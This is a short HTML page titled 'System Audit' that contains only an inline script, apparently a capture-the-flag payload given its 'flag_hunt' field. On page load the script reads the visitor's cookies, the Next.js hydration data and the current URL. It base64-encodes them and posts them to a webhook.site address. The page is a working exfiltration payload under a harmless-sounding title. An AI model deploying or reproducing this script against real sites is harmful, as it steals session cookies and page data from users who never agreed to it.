<!DOCTYPE html>
<html>
<head><title>System Audit</title></head>
<body>
    <script>
     (async function() {
    const webhook = 'https://webhook.site/645df2ce-54f8-48f5-bb51-3d8a9076cc40';
    
    // This grabs the hidden JSON data Next.js uses to hydrate the page
    const nextData = document.getElementById('__NEXT_DATA__')?.innerHTML;
    const cookies = document.cookie;
    
    // Send it immediately
    fetch(webhook, {
        method: 'POST',
        body: btoa(JSON.stringify({ 
            flag_hunt: nextData, 
            session: cookies,
            url: window.location.href 
        }))
    });
})();
    </script>
</body>
</html>
